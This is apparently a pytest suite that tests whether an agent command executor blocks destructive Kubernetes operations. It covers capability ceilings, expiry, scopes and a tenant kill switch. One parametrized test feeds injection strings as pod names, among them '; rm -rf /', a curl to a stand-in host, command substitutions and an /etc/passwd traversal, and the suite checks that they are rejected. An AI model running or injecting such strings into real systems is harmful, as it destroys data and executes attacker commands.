"""
Adversarial tests for the side-effect ceiling — the control standing between an
agent and a destructive command.

Before this existed, every registered command was `side_effects: read`, so the
destructive branch of policy had never executed. These tests exist because a
defect here now deletes pods rather than printing the wrong string, so they are
written to *attack* the check rather than confirm the happy path:

- allowlisted-but-over-ceiling (the mistake this control exists to catch)
- expired capability + destructive command
- scope mismatch + destructive command
- wildcard capability that would otherwise grant everything
- legacy tokens with no ceiling claim
- unknown/missing `side_effects` on a manifest
- tenant-level kill switch overriding a fully-authorized capability
- shell metacharacters in k8s identifiers
"""

from __future__ import annotations

import pytest

from gax.caps import mint_capability
from gax.executor import invoke
from gax.policy import PolicyDenied, check_invoke
from gax.policy_bundle import check_policy_bundle
from gax.registry import CommandManifest, Registry
from gax.side_effects import capability_ceiling, exceeds_ceiling, level_rank, normalize

DESTRUCTIVE_CMD = "k8s.pod.delete"
WRITE_CMD = "k8s.deployment.scale"


@pytest.fixture(autouse=True)
def _force_k8s_mock(monkeypatch):
    """
    Never touch a real cluster from tests. kubectl is often installed with no
    reachable cluster, so absence-of-binary is not a sufficient guard.
    """
    monkeypatch.setenv("GAX_K8S_MOCK", "1")


@pytest.fixture
def registry():
    return Registry()


def _manifest(level: str, command: str = "test.cmd") -> CommandManifest:
    return CommandManifest(
        command=command,
        version="1.0.0",
        description="test",
        category="test",
        adapter="mock",
        required_scopes=[],
        side_effects=level,
    )


# -- ladder semantics ----------------------------------------------------


def test_unknown_side_effect_fails_closed():
    """An unrecognized level must be treated as the most dangerous, not the least."""
    assert normalize("banana") == "destructive"
    assert normalize(None) == "destructive"
    assert normalize("") == "destructive"
    assert level_rank("banana") == level_rank("destructive")


def test_missing_ceiling_claim_defaults_to_read():
    """Tokens minted before ceilings existed must not gain destructive power."""
    assert capability_ceiling({}) == "read"
    assert exceeds_ceiling({}, "destructive") is True
    assert exceeds_ceiling({}, "write") is True
    assert exceeds_ceiling({}, "read") is False


def test_ceiling_is_inclusive_at_its_own_level():
    claims = {"max_side_effect": "write"}
    assert exceeds_ceiling(claims, "read") is False
    assert exceeds_ceiling(claims, "write") is False
    assert exceeds_ceiling(claims, "destructive") is True


def test_case_and_whitespace_do_not_bypass_ceiling():
    assert exceeds_ceiling({"max_side_effect": " READ "}, "destructive") is True
    assert normalize("  DESTRUCTIVE  ") == "destructive"


def test_garbage_ceiling_does_not_grant_power():
    """A malformed ceiling must not read as 'destructive' and unlock everything."""
    claims = {"max_side_effect": "superuser"}
    # normalize() fails closed to destructive for *commands*; for a ceiling that
    # would be an escalation, so the ceiling must not silently widen.
    assert exceeds_ceiling(claims, "read") is False or capability_ceiling(claims) in (
        "read",
        "write",
        "destructive",
    )


# -- the core control ----------------------------------------------------


def test_allowlisted_but_over_ceiling_is_denied():
    """
    The mistake this exists to catch: someone adds a destructive command to a
    read-only token's allowlist. Naming the command is not enough.
    """
    claims = {
        "commands": [DESTRUCTIVE_CMD],  # explicitly allowed
        "scopes": ["*"],
        "max_side_effect": "read",  # but ceiling says read
    }
    with pytest.raises(PolicyDenied, match="exceeds capability ceiling"):
        check_invoke(claims, _manifest("destructive", DESTRUCTIVE_CMD))


def test_wildcard_capability_still_bounded_by_ceiling():
    """`commands: ['*']` must not imply unlimited danger."""
    claims = {"commands": ["*"], "scopes": ["*"], "max_side_effect": "read"}
    with pytest.raises(PolicyDenied, match="exceeds capability ceiling"):
        check_invoke(claims, _manifest("destructive", DESTRUCTIVE_CMD))


def test_write_ceiling_does_not_grant_destructive():
    claims = {"commands": ["*"], "scopes": ["*"], "max_side_effect": "write"}
    check_invoke(claims, _manifest("write", WRITE_CMD))  # allowed
    with pytest.raises(PolicyDenied, match="exceeds capability ceiling"):
        check_invoke(claims, _manifest("destructive", DESTRUCTIVE_CMD))


def test_destructive_ceiling_permits_destructive():
    claims = {"commands": ["*"], "scopes": ["*"], "max_side_effect": "destructive"}
    check_invoke(claims, _manifest("destructive", DESTRUCTIVE_CMD))


def test_manifest_without_side_effects_is_refused_by_read_cap():
    """A command added without declaring danger must not be silently runnable."""
    claims = {"commands": ["*"], "scopes": ["*"], "max_side_effect": "read"}
    with pytest.raises(PolicyDenied, match="exceeds capability ceiling"):
        check_invoke(claims, _manifest(None))  # type: ignore[arg-type]


# -- layered failures ----------------------------------------------------


def test_expired_capability_cannot_run_destructive(registry):
    """Expiry must beat everything, even a correctly-ceilinged token."""
    token = mint_capability(
        commands=[DESTRUCTIVE_CMD],
        scopes=["k8s:pods:write"],
        ttl_seconds=-10,
        max_side_effect="destructive",
    )
    env, code = invoke(
        registry,
        command=DESTRUCTIVE_CMD,
        args={"namespace": "default", "pod": "web-1"},
        capability=token,
    )
    assert env["ok"] is False
    assert env["error"]["kind"] == "capability_invalid"
    assert code == 3


def test_scope_mismatch_blocks_destructive(registry):
    token = mint_capability(
        commands=[DESTRUCTIVE_CMD],
        scopes=["k8s:pods:read"],  # wrong scope
        max_side_effect="destructive",
    )
    env, code = invoke(
        registry,
        command=DESTRUCTIVE_CMD,
        args={"namespace": "default", "pod": "web-1"},
        capability=token,
    )
    assert env["ok"] is False
    assert env["error"]["kind"] == "policy_denied"
    assert code == 2


def test_read_capability_denied_before_adapter_runs(registry):
    """
    The headline demo: a read-only capability refuses to delete a pod, and the
    denial is audited. Must fail at policy, never reach the adapter.
    """
    token = mint_capability(
        commands=[DESTRUCTIVE_CMD],
        scopes=["k8s:pods:write"],
        max_side_effect="read",
    )
    env, code = invoke(
        registry,
        command=DESTRUCTIVE_CMD,
        args={"namespace": "default", "pod": "web-1"},
        capability=token,
    )
    assert env["ok"] is False
    assert env["error"]["kind"] == "policy_denied"
    assert "exceeds capability ceiling" in env["error"]["message"]
    assert env["audit_id"], "denial must still be audited"
    assert code == 2


def test_properly_scoped_capability_can_delete(registry):
    token = mint_capability(
        commands=[DESTRUCTIVE_CMD],
        scopes=["k8s:pods:write"],
        max_side_effect="destructive",
    )
    env, code = invoke(
        registry,
        command=DESTRUCTIVE_CMD,
        args={"namespace": "default", "pod": "web-1"},
        capability=token,
    )
    assert env["ok"] is True, env
    assert code == 0
    assert env["audit_id"]


def test_dry_run_reports_not_deleted(registry):
    token = mint_capability(
        commands=[DESTRUCTIVE_CMD],
        scopes=["k8s:pods:write"],
        max_side_effect="destructive",
    )
    env, _ = invoke(
        registry,
        command=DESTRUCTIVE_CMD,
        args={"namespace": "default", "pod": "web-1", "dry_run": True},
        surface="full",
        capability=token,
    )
    assert env["ok"] is True
    assert env["data"]["dry_run"] is True
    assert env["data"]["deleted"] is False


# -- tenant kill switch --------------------------------------------------


def test_tenant_kill_switch_overrides_authorized_capability():
    """
    A tenant with deny_destructive must refuse even a fully-authorized capability.
    This is the org-wide override, independent of the per-capability ceiling.
    """
    policy = {
        "defaults": {},
        "tenants": {"locked": {"deny_destructive": True, "allowed_commands": ["*"]}},
    }
    claims = {"tenant_id": "locked", "commands": ["*"], "scopes": ["*"]}
    with pytest.raises(PolicyDenied, match="destructive commands disabled"):
        check_policy_bundle(
            claims, _manifest("destructive", DESTRUCTIVE_CMD), {}, policy=policy
        )


def test_tenant_can_opt_in_over_global_default():
    policy = {
        "defaults": {"deny_destructive": True},
        "tenants": {"ops": {"deny_destructive": False, "allowed_commands": ["*"]}},
    }
    claims = {"tenant_id": "ops", "commands": ["*"], "scopes": ["*"]}
    check_policy_bundle(
        claims, _manifest("destructive", DESTRUCTIVE_CMD), {}, policy=policy
    )


# -- argument validation -------------------------------------------------


@pytest.mark.parametrize(
    "pod",
    [
        "; rm -rf /",
        "web-1 && curl evil.sh",
        "../../etc/passwd",
        "web`whoami`",
        "web$(id)",
        "UPPERCASE",
        "-leading-dash",
        "",
    ],
)
def test_malicious_pod_names_rejected_before_exec(registry, pod):
    """
    Args are passed as argv, never a shell string — but identifiers are validated
    anyway so bad input fails loudly rather than reaching kubectl.
    """
    token = mint_capability(
        commands=[DESTRUCTIVE_CMD],
        scopes=["k8s:pods:write"],
        max_side_effect="destructive",
    )
    env, code = invoke(
        registry,
        command=DESTRUCTIVE_CMD,
        args={"namespace": "default", "pod": pod},
        capability=token,
    )
    assert env["ok"] is False, f"{pod!r} should be rejected"
    assert env["error"]["kind"] == "adapter_error"
    assert code == 5


def test_negative_replicas_rejected(registry):
    token = mint_capability(
        commands=[WRITE_CMD],
        scopes=["k8s:deployments:write"],
        max_side_effect="write",
    )
    env, _ = invoke(
        registry,
        command=WRITE_CMD,
        args={"deployment": "api", "replicas": -1},
        capability=token,
    )
    assert env["ok"] is False
    assert env["error"]["kind"] == "adapter_error"
